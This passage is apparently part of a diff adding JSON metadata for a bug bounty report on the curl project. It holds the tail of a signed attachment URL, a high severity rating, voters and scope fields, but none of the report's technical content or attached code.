w1nGcJCb2SmlaCvDp%2Frnem7XLpd6CpO2Mj0BDmOv7O%2FgLSMsF%2FsJw6l58OzQaFtZdTP%2FZs1BZzqSjKiCv59vBWzvIPBNJi%2BsCTmjfSW0F4cmwl%2BhWnjJm7Gui0KTz2sGv66SkOSwCLSnr24uXkT%2FgdVjRKlUGZjQD%2Bkzt5JHTelk7z7aZB7GHTNpfY%2B0dPPhIFP0MNobnw2%2Be%2Fh2f11jEbFKZgcCdTFTLgURGAiDJ%2FHQRi9QElHOxE6cc3J%2BeXrJeQrex27VwOg4Z%2BPvlfrBWNZH5pQOUKe%2BXwOyX4kEZ%2FZaH2DH91f%2FoT51O1scwtrE5TukGUl6taOA%2FHI2npYnbZ9CuTANmy%2BkuwxbqXvMlo5c%2F01r2RVgZjXOC35r5mtGnO0H9lnqF7OqLQ4RYtxB9Y0jfOB%2Fu9aPd7KKLpwGGWx6GO2kfj8vA%2BQfL52LND%2F2Igx%2F6A5jk6BuDvvrjJntVcHw86MlxLnEIzQXyTCxgdb%2BMF6yx3Ap6eduFgRglZ%2BpLBYUVQ4QvrmGsVKuiPebm%2B3c1cL27jjciIvQ%2FRViLXFhe3VA%2F2GtTk9ZSiMiJcIW7fsnkVx9B6M09iT%2BgIhCFelEZC9Fe42Fi8Kt%2BH04c%2FhQkdzNArnRL9dcacXib2Gm09xYmOJkDTGiVLmF25hO5IH8sA0ryyveyTb2hClqGmaSH9h8LFR7dafxdvL0YsVO2Q67njMOs1AOnBinL7%2FtBCKcmogx9IV4SIAS9D4tB4fImrztVuzPhzXkUmunMO3x%2FM8GOrAB4RBaOoMy3QcIAkROwiAvFdiQiqgGq8c4ZTOZLftx1DsFQHfEEt%2FL7P370O%2BL%2BiJHiZPnztp4%2Fp5mzmhLdtZgvFKwNjTMLnf6Rvo7nM1lf%2BVecMIy96%2FPtmUNV1QsqMqqLod52JSlzuoVg1nWjppdgKgtD63tBkqZ7dMkbvTzb5XQfUnLsuBSXG50NCgQ%2Bg0ZjToNMmOxIZOvedj1Bbi5g8Erd4lCDA%2F7ODFnLlXxPhQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=862c74b243e33eec4aa2d661ad5dcbabb1fdd1b6a14d2bc019eecb191df1b032",
+      "file_size": 3076,
+      "type": "text/x-c++src",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 5,
+  "voters": [
+    "2026",
+    "ngvuthdanhh",
+    "corrinaalcoser",
+    "anon7119",
+    "johnny272"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
